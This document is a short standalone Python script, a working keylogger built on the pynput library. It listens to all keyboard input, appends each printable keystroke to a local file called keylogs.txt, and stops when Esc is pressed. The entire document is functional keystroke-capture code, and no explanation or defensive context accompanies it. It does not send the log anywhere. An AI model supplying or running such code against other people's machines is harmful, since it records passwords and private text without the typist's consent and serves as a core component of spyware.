from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(key)
    write_to_file(keys)

def write_to_file(keys):
    with open("keylogs.txt", "a") as f:  # Change "w" to "a" to append instead of overwrite
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")  # Write newline for space
            elif k.find("Key") == -1:
                f.write(k)  # Write actual key presses
        keys.clear()  # Clear list to prevent duplicate entries

def on_release(key):
    if key == Key.esc:
        return False  # Stop listener when Esc is pressed

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
